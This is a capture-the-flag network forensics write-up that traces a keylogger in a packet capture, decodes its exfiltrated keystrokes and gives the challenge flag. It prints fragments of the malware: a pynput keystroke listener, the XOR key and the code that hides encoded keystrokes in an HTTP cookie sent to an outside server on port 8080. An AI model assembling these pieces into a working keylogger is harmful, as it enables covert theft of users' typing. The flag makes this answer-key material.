# Room Access — Network Forensics Write-up

## Challenge Information

**Category:** Network Forensics  
**Techniques:** PCAP Analysis, Covert Communication, Cryptography

### Objectives

- Analyze the provided packet capture for a covert communication channel.
- Identify where the exfiltrated data is hidden.
- Reassemble and decode the recovered data.
- Submit the flag.

---

## 1. Open the Capture

Open the provided capture file in **Wireshark**.

The challenge hint says:

> "laptop ping some random :8080 address"

This suggests looking for network traffic involving **TCP port 8080**.

Use the following Wireshark display filter:

```text
tcp.port == 8080
```

This reveals traffic between:

```text
34.41.103.191:8080
192.168.1.141
```

Next, select one of the TCP packets and choose:

**Right-click → Follow → TCP Stream**

While inspecting the stream, I found a Python file being transferred:

```text
/temp/updates.py
```

This looks suspicious and is worth investigating.

---

## 2. Understanding the Python File

The Python file contains several important clues.

### Finding the XOR key

The `getkey()` function is:

```python
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2
```

Combining the two strings gives the complete key:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

### Identifying keyboard monitoring

The script imports:

```python
from pynput import keyboard
```

And uses:

```python
def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")
```

This indicates that the script monitors keyboard input.

Every time a key is pressed, the character is passed to:

```python
sendltr(key.char)
```

This suggests the script is capturing keystrokes.

---

## 3. Understanding the Data Exfiltration

Inside `sendltr()`, the captured character is converted into bytes:

```python
raw_bytes = character.encode('utf-8')
```

The data is then XOR encrypted:

```python
encrypted = xor(raw_bytes, getkey().encode('utf-8'))
```

The `xor()` function is:

```python
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

After encryption, the result is Base64 encoded:

```python
b64_string = base64.b64encode(encrypted).decode('utf-8')
```

Finally, the Base64 value is placed inside an HTTP cookie:

```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
    "Cookie": f"hotel_sess_state={b64_string}"
}
```

Therefore, the covert communication channel is:

```text
Keyboard Input
      ↓
XOR Encryption
      ↓
Base64 Encoding
      ↓
HTTP Cookie
      ↓
hotel_sess_state
      ↓
HTTP Request to :8080
```

The exfiltrated data is hidden inside the:

```text
hotel_sess_state
```

HTTP cookie.

---

## 4. Extract the HTTP Cookies

To find the exfiltrated data in Wireshark, filter HTTP requests:

```text
http.request
```

Then inspect:

**Hypertext Transfer Protocol → Cookie**

The suspicious cookie is:

```text
hotel_sess_state
```

Extracting the values gives the following 30 Base64-encoded values:

```text
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
```

Each value represents one encrypted character.

---

## 5. Decode the Base64 Data

Base64 decoding alone does not reveal readable text because the data was XOR encrypted first.

For example:

```bash
echo 'HA==' | base64 -d | xxd
```

Output:

```text
00000000: 1c
```

Therefore:

```text
HA== → 0x1c
```

---

## 6. XOR Decryption

From the Python script, we already recovered the key:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

The first character of the key is:

```text
H
```

ASCII value:

```text
H = 0x48
```

The first encrypted byte is:

```text
0x1c
```

XOR them:

```text
0x1c XOR 0x48 = 0x54
```

`0x54` corresponds to:

```text
T
```

So:

```text
HA==
   ↓ Base64 decode
0x1c
   ↓ XOR 0x48
0x54
   ↓ ASCII
T
```

### Why is only `H` used?

This is an important detail.

The malware encrypts **one character per HTTP request**.

For a single character:

```python
data = character.encode('utf-8')
```

The XOR function starts with:

```python
key[0]
```

Therefore, every individual request uses the first byte of the key:

```text
H = 0x48
```

The remaining characters of the key are not used for these individual one-byte payloads.

---

## 7. Automating the Decryption

Instead of manually decoding all 30 values, we can automate the process with Python.

Create a file:

```bash
nano decode.py
```

Add:

```python
import base64

data = """
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
"""

key = ord("H")

result = ""

for value in data.split():
    encrypted = base64.b64decode(value)

    # One encrypted byte = one exfiltrated character
    decrypted = encrypted[0] ^ key

    result += chr(decrypted)

print(result)
```

Run it with:

```bash
python3 decode.py
```

The output is:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

---

## 8. Attack / Exfiltration Flow

```text
Victim keyboard input
        │
        ▼
pynput keyboard listener
        │
        ▼
Capture one character
        │
        ▼
XOR with 0x48 ('H')
        │
        ▼
Base64 encode
        │
        ▼
hotel_sess_state cookie
        │
        ▼
HTTP GET request
        │
        ▼
34.41.103.191:8080
        │
        ▼
PCAP capture
        │
        ▼
Extract cookies
        │
        ▼
Base64 decode
        │
        ▼
XOR with 0x48
        │
        ▼
Reassemble characters
        │
        ▼
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

---

## 9. Key Findings

| Finding | Value |
|---|---|
| Category | Network Forensics |
| Suspicious port | `8080` |
| C2 / Server | `34.41.103.191:8080` |
| Victim | `192.168.1.141` |
| Suspicious file | `/temp/updates.py` |
| Technique | Keylogging |
| Python library | `pynput.keyboard` |
| Exfiltration channel | HTTP |
| Hidden location | HTTP Cookie |
| Cookie name | `hotel_sess_state` |
| Encoding | Base64 |
| Encryption | XOR |
| XOR byte used | `H` / `0x48` |
| Key from script | `H0t3lSt@ff0NlyK3epS3cr3t!` |
| Data unit | One character per request |

---

## 10. Flag

The final decoded flag is:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

---

## Conclusion

The PCAP contained a covert keylogging and exfiltration mechanism disguised as normal HTTP traffic.

The suspicious Python script revealed that:

1. Keyboard input was captured using `pynput`.
2. Each character was XOR encrypted.
3. The encrypted byte was Base64 encoded.
4. The encoded data was placed inside the `hotel_sess_state` HTTP cookie.
5. The requests were repeatedly sent to the server on TCP port `8080`.
6. Extracting the cookies, Base64 decoding them, and XORing each byte with `0x48` reconstructed the original keystrokes.

The recovered flag was:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```
